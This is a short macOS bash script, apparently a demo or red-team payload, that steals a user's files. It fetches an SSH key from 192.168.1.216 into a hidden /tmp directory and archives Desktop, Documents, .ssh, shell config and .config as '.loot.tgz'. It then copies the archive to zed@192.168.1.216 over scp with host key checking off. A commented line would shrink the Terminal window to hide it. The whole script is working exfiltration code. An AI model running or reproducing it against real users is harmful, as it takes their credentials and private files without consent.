#!/bin/bash

# osascript -e 'tell application "Terminal" to set boounds of front window to {3000, 2000, 10, 10}'

HOME="/Users/$USER"

mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://192.168.1.216/sh -o /tmp/.s/.t/.e/.a/.l/.s 
chmod 600 /tmp/.s/.t/.e/.a/.l/.s

cd /tmp/.s/.t/.e/.a/.l
tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*

scp -q -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz zed@192.168.1.216:~/demo/